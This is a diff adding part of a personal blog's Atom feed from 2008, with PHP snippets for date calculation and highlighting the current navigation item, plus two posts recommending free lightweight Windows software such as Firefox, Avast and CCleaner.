+    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;elseif&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mon&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;m&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$date&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mday&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;j&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$date&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mon&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;12&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="nv"&gt;$nm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mon&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;year&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+            &lt;span class="nv"&gt;$ff&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;get_day&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;first&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;friday&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$nm&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="nv"&gt;$ff&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$date&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="c1"&gt;// I know this code is crap, deal with it or fix it yourself!&lt;/span&gt;
+
+    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;F j, Y&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$ff&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;I apologies for the crappy code, I was either tired, drunk or both the night I
+wrote this.&lt;/p&gt;</summary><category term="Code"></category><category term="First Friday"></category><category term="PHP"></category><category term="PHX2600"></category><category term="Web Development"></category></entry><entry><title>Free Alternative Lightweight Software for Windows (Part 2)</title><link href="http://blog.chriskankiewicz.com/free-alternative-lightweight-software-for-windows-part-2.html" rel="alternate"></link><published>2008-10-13T00:00:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2008-10-13:free-alternative-lightweight-software-for-windows-part-2.html</id><summary type="html">&lt;p&gt;Part 2 of my Free Alternative Lightweight Software for Windows will cover basic
+security and performance enhancing/maintenance tools.&lt;/p&gt;
+&lt;p&gt;I have broken this article into four parts to make it easier on both you, the
+reader, and me. As I publish the other sections of this article, I will add a
+link to them.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Part 1 - &lt;a href="http://blog.chriskankiewicz.com/free-alternative-lightweight-software-for-windows-part-1.html"&gt;Communication/Business Tools&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Part 2 - Security/Performance Tools&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Part 3 - Media Tools (Never published)&lt;/li&gt;
+&lt;li&gt;Part 4 - Miscellaneous Tools (Never published)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h2&gt;&lt;a href="http://www.avast.com/"&gt;Avast! Antivirus&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Replaces:&lt;/strong&gt; Norton Antivirus, McAffee Antivirus&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Alternatives:&lt;/strong&gt; &lt;a href="http://free.avg.com/"&gt;AVG&lt;/a&gt;, &lt;a href="http://www.avira.com/"&gt;Avira&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Pros:&lt;/strong&gt; Unobtrusive, Lightweight, Fast&lt;/p&gt;
+&lt;p&gt;Avast! antivirus is powerful anti virus software, but, unlike its mainstream
+competitors, Norton and McAffee, you’ll barely be able to tell that it’s there.
+Avast! is lightweight and unobtrusive, it wont bog down your system and barely
+bugs you unless it finds a virus or other malicious code. The home edition of
+Avast! is free for 13 months if you register it, and when it expires, all you
+have to do is register again to get another 13 months of updates.&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://www.avast.com/eng/download-avast-home.html"&gt;Download Avast! Antivirus&lt;/a&gt; |
+&lt;a href="http://www.filehippo.com/download_avast_antivirus/"&gt;Mirror&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;&lt;a href="http://www.microsoft.com/windows/products/winfamily/defender/default.mspx"&gt;Windows Defender&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Replaces:&lt;/strong&gt; Ad-Aware&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Alternatives:&lt;/strong&gt; N/A&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Pros:&lt;/strong&gt; Unobtrusive, Lightweight, Fast&lt;/p&gt;
+&lt;p&gt;What’s that? A product by Microsoft that isn’t a piece of crap? And it’s free to
+anyone with Windows XP or Vista?! It’s hard to believe, but it’s true, Windows
+Defender is actually a solid product, and free so long as you’re using XP or
+Vista. Also, unlike it’s alternatives, Windows Defender never bugs you unless it
+finds some malicious software. The one thing I will say that it has working
+against it though is that it uses Windows Update for maintaining its spyware
+list.&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://tinyurl.com/dyvaw"&gt;Download Windows Defender&lt;/a&gt; |
+&lt;a href="http://www.filehippo.com/download_microsoft_antispyware/"&gt;Mirror&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;&lt;a href="http://www.piriform.com/ccleaner"&gt;CCleaner&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Replaces:&lt;/strong&gt; N/A&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Alternatives:&lt;/strong&gt; N/A&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Pros:&lt;/strong&gt; Lightweight, Fast, Automation&lt;/p&gt;
+&lt;p&gt;From CCleaner.com:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;CCleaner is a freeware system optimization, privacy and cleaning tool. It
+removes unused files from your system – allowing Windows to run faster and
+freeing up valuable hard disk space. It also cleans traces of your online
+activities such as your Internet history. Additionally it contains a fully
+featured registry cleaner. But the best part is that it’s fast&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;a href="http://www.ccleaner.com/download"&gt;Download CCleaner&lt;/a&gt; |
+&lt;a href="http://www.filehippo.com/download_ccleaner/"&gt;Mirror&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;&lt;a href="http://www.piriform.com/defraggler"&gt;Defraggler&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Replaces:&lt;/strong&gt; Windows Defrag Tool&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Alternatives:&lt;/strong&gt; N/A&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Pros:&lt;/strong&gt; Lightweight, Fast&lt;/p&gt;
+&lt;p&gt;Defraggler is a freeware hard drive defraging tool by Piriform, the same people
+who created CCleaner. Defragglers differs from most defrag tools on the market,
+by allowing you to easily defrag individual files, without the need to defrag
+the whole drive. All you ahve to do is run it, select the file(s) you would like
+to defrag and in seconds that file will be fully defragmented. Of course you
+always have the option to defrag the whole drive.&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://www.defraggler.com/download"&gt;Download Dfraggler&lt;/a&gt; |
+&lt;a href="http://www.filehippo.com/download_defraggler/"&gt;Mirror&lt;/a&gt;&lt;/p&gt;</summary><category term="Avast! Antivirus"></category><category term="CCleaner"></category><category term="Defraggler"></category><category term="Defragler"></category><category term="Open Source"></category><category term="Software"></category><category term="Windows Defender"></category></entry><entry><title>Creating Dynamic Menus with PHP and CSS</title><link href="http://blog.chriskankiewicz.com/creating-dynamic-menus-with-php-and-css.html" rel="alternate"></link><published>2008-10-05T00:00:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2008-10-05:creating-dynamic-menus-with-php-and-css.html</id><summary type="html">&lt;p&gt;Want to pep up your web page with some dynamic menus? Here’s a simple solution
+that only requires a few lines of PHP and CSS.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;UPDATE (11/1/08):&lt;/strong&gt; Simplified the header code and edited the syntax of the
+list element echo code.&lt;/p&gt;
+&lt;h2&gt;The PHP&lt;/h2&gt;
+&lt;p&gt;Add the following to the top of your page (before the DOCTYPE or HTML tag).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class="c1"&gt;// Get current page file name&lt;/span&gt;
+    &lt;span class="nv"&gt;$page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;basename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PHP_SELF&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then add the following to your menu item where you want the class designation to
+show up.&lt;/p&gt;
+&lt;p&gt;Each link should have this piece of code in it. Make sure you replace
+&lt;code&gt;index.php&lt;/code&gt; with the appropriate file name for the page. Example:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;navigation&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt; &lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$page&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;class=&amp;quot;current&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Home&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;resume.php&amp;quot;&lt;/span&gt; &lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$page&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;resume.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;class=&amp;quot;current&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Resume&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;photography.php&amp;quot;&lt;/span&gt; &lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$page&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;photography.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;class=&amp;quot;current&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Photography&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;about.php&amp;quot;&lt;/span&gt; &lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$page&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;about.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;class=&amp;quot;current&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;About&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;contact.php&amp;quot;&lt;/span&gt; &lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$page&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;contact.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;class=&amp;quot;current&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Contact&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; the 2 chevrons (&lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;) at the end are on purpose. One closes the PHP tag
+the other closes the &lt;code&gt;a&lt;/code&gt; tag.&lt;/p&gt;
+&lt;h2&gt;The CSS&lt;/h2&gt;
+&lt;p&gt;Lastly, add the following element to your style sheet and style it as you
+please.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nn"&gt;#navigation&lt;/span&gt; &lt;span class="nt"&gt;ul&lt;/span&gt; &lt;span class="nt"&gt;li&lt;/span&gt; &lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="nc"&gt;.current&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nb"&gt;background-color&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#FFF&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nb"&gt;border-bottom&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="m"&gt;1px&lt;/span&gt; &lt;span class="nb"&gt;solid&lt;/span&gt; &lt;span class="m"&gt;#FFF&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This process will result in the following:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Tabs with HTML/CSS/PHP" src="{filename}/images/creating-dynamic-menus-with-php-and-css/tabs-with-html-css-php.png" /&gt;&lt;/p&gt;</summary><category term="CSS"></category><category term="HTML"></category><category term="PHP"></category><category term="Web Development"></category></entry><entry><title>Free Alternative Lightweight Software for Windows (Part 1)</title><link href="http://blog.chriskankiewicz.com/free-alternative-lightweight-software-for-windows-part-1.html" rel="alternate"></link><published>2008-10-03T00:00:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2008-10-03:free-alternative-lightweight-software-for-windows-part-1.html</id><summary type="html">&lt;p&gt;Sick of your computer running like molasses? Tired of having to perform that
+annual (semi-annual?) reformat and installation of your operating system? Do you
+wish your computer just ran faster? Well maybe some free alternative lightweight
+software will solve your problem! On the other hand, if you enjoy the time you
+have to make coffee while you load that simple .PDF file, please stop reading
+now.&lt;/p&gt;
+&lt;p&gt;I have a fairly complex, yet powerful, Windows box that I run as my primary
+machine and it runs great. Now this is by no coincidence, it’s taken some hard
+work to make this thing run like a well oiled machine. I do, however, owe a
+great deal of thanks to the plethora of free (as in beer), lightweight software
+I have installed. What software you might ask? Well here’s a list I’ve compiled
+of some of the best software I’ve run into that will keep your computer from
+slowing down and your resources free so you can do more important things, like
+surf for porn.&lt;/p&gt;
+&lt;p&gt;I have broken this article into four parts to make it easier on both you, the
+reader, and me. As I publish the other sections of this article, I will add a
+link to them.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Part 1 - Communication/Business Tools&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Part 2 - &lt;a href="http://blog.chriskankiewicz.com/post/4217685381/free-alternative-lightweight-software-for-windows-part-2"&gt;Security/Performance Tools&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Part 3 - Media Tools (Never published)&lt;/li&gt;
+&lt;li&gt;Part 4 - Miscellaneous Tools (Never published)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h2&gt;&lt;a href="http://www.mozilla.com/en-US/firefox/fx/"&gt;Firefox&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Replaces:&lt;/strong&gt; Internet Explorer&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Alternatives:&lt;/strong&gt; &lt;a href="http://www.apple.com/safari/"&gt;Safari&lt;/a&gt;,
+&lt;a href="http://www.google.com/chrome"&gt;Chrome&lt;/a&gt;, &lt;a href="http://www.opera.com/"&gt;Opera&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Pros:&lt;/strong&gt; Speed, Extensions, Open Source&lt;/p&gt;
+&lt;p&gt;Firefox is an open source alternative web browser by Mozilla that provides a
+much better web browsing experience than it’s defacto alternative, Internet
+Explorer. Some of the key features of Firefox include enhanced security
+features, increased speed, and virtually limitless customization through themes
+and extensions. Be sure to pay attention as Mozilla will soon be releasing
+Firefox 3.1 which is supposed to include a few new features and even more speed
+improvements.&lt;/p&gt;
+&lt;p&gt;Recommended Extensions:
+&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/adblock-plus/"&gt;Adblock Plus&lt;/a&gt;,
+Filterset.G Updater, Foxmarks Bookmark Sync, and IE Tab&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://www.mozilla.com/en-US/firefox/"&gt;Download Firefox&lt;/a&gt; |
+&lt;a href="http://www.filehippo.com/download_firefox/"&gt;Mirror&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;&lt;a href="http://www.mozillamessaging.com/en-US/thunderbird/"&gt;Thunderbird&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Replaces:&lt;/strong&gt; Microsoft Outlook, Outlook Express&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Alternatives:&lt;/strong&gt; &lt;a href="https://www.gmail.com/"&gt;Gmail&lt;/a&gt;,
+&lt;a href="https://mail.yahoo.com/"&gt;Yahoo! Mail&lt;/a&gt;,
+&lt;a href="www.hotmail.com/"&gt;Windows Live Hotmail&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Pros:&lt;/strong&gt; Extensions, Open Source&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Cons:&lt;/strong&gt; No Exchange support (yet)&lt;/p&gt;
+&lt;p&gt;Another great product from the Mozilla team, the Thunderbird email client, is a
+great alternative to the pre-installed Outlook Express and, with the right
+extensions, an adequate replacement for Microsoft Outlook. The biggest drawback
+with Thunderbird right now is the lack of MS Exchange support, but (as far as I
+know) they plan on changing that with the release of Thunderbird 3.0.&lt;/p&gt;
+&lt;p&gt;Recommended Extensions: Lightning, Provider, Enigmail&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://www.mozilla.com/en-US/thunderbird/"&gt;Download Thunderbird&lt;/a&gt; |
+&lt;a href="http://www.filehippo.com/download_thunderbird/"&gt;Mirror&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;&lt;a href="http://www.pidgin.im"&gt;Pidgin&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Replaces:&lt;/strong&gt; AOL Instant Messenger, Yahoo! Messenger, MSN Messenger&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Alternatives:&lt;/strong&gt; &lt;a href="http://www.trillian.im/"&gt;Trillian&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Pros:&lt;/strong&gt; Ad Free, Plugins, Open Source&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Cons:&lt;/strong&gt; No Video Chat (at the moment)&lt;/p&gt;
+&lt;p&gt;Pidgin is a free instant messaging platform designed to centralize the vast
+array of popular instant messaging protocols in to one easy to use program.
+Pidgin allows you to be logged on to multiple instant messaging systems at the
+same time through one simple user interface. The following protocols are
+supported: AIM, MSN, Yahoo!, Gtalk/Jabber, ICQ, Gadu Gadu, and more…&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://www.pidgin.im/download"&gt;Download Pidgin&lt;/a&gt; |
+&lt;a href="http://www.filehippo.com/download_pidgin/"&gt;Mirror&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;&lt;a href="http://www.openoffice.org"&gt;OpenOffice.org&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Replaces:&lt;/strong&gt; Microsoft Office&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Alternatives:&lt;/strong&gt; N/A&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Pros:&lt;/strong&gt; Plugins, Open Source, Can read from and write to MS Office files&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Cons:&lt;/strong&gt; (Very) Slight Learning Curve&lt;/p&gt;
+&lt;p&gt;Just get a new computer and don’t want to fork out another $150 for word
+processing software? Well then OpenOffice.org is your answer! OpenOffice.org is
+a free and open source office software suite. Included are applications for word
+processing, spreadsheets, presentations, graphics, databases and more. And just
+when you thought it couldn’t get any better, OpenOffice.org 3.0 is currently in
+it’s third revision of a release candidate and will hopefully be out with a
+final version soon.&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://download.openoffice.org/index.html"&gt;Download OpenOffice.org&lt;/a&gt; |
+&lt;a href="http://www.filehippo.com/download_openoffice/"&gt;Mirror&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;&lt;a href="http://notepad-plus-plus.org/"&gt;Notepad++&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Replaces:&lt;/strong&gt; Notepad&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Alternatives:&lt;/strong&gt; &lt;a href="http://www.flos-freeware.ch/notepad2.html"&gt;Notepad2&lt;/a&gt;,
+&lt;a href="http://www.jedit.org/"&gt;Jedit&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Pros:&lt;/strong&gt; Lightweight, Plugins, Open Source&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Cons:&lt;/strong&gt; N/A&lt;/p&gt;
+&lt;p&gt;Notepad++ is one of many Notepad replacements. Unlike typical Notepad, however,
+Notepad++ features many front and back end improvements. On the front end you
+have such noticeable features like tabbed files, line numbers, syntax
+highlighting, syntax folding, and code completion. In te rms of back end
+improvements, the following is taken from the Notepad++ homepage:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Based on a powerful editing component Scintilla, Notepad++ is written in C++
+and uses pure Win32 API and STL which ensures a higher execution speed and
+smaller program size.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;a href="http://notepad-plus.sourceforge.net/uk/site.htm"&gt;Download Notepad++&lt;/a&gt; |
+&lt;a href="http://www.filehippo.com/download_notepad/"&gt;Mirror&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;&lt;a href="http://www.foxitsoftware.com/pdf/reader/"&gt;Foxit Reader&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Replaces:&lt;/strong&gt; Adobe PDF Reader&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Alternatives:&lt;/strong&gt; N/A&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Pros:&lt;/strong&gt; Lightweight, Fast, Plugins, Annotation Tool&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Cons:&lt;/strong&gt; Occasional Rendering Mistakes (very rare)&lt;/p&gt;
+&lt;p&gt;Of all the software on this list, you will probably notice the biggest
+difference in speed and performance when using Foxit Reader. Compared to the
+“official” Adobe PDF Reader, Foxit Reader is incredibly small (just over 2.5MB),
+blazing fast, and its core function is compatible with PDF Standard 1.7. Foxit
+Reader also comes standard with an annotation tool, unlike Adobe, who would
+charge you $299 for their pro version to get feature.&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://www.foxitsoftware.com/pdf/reader_2/down_reader.htm"&gt;Download Foxit Reader&lt;/a&gt; |
+&lt;a href="http://www.filehippo.com/download_foxit/"&gt;Mirror&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;
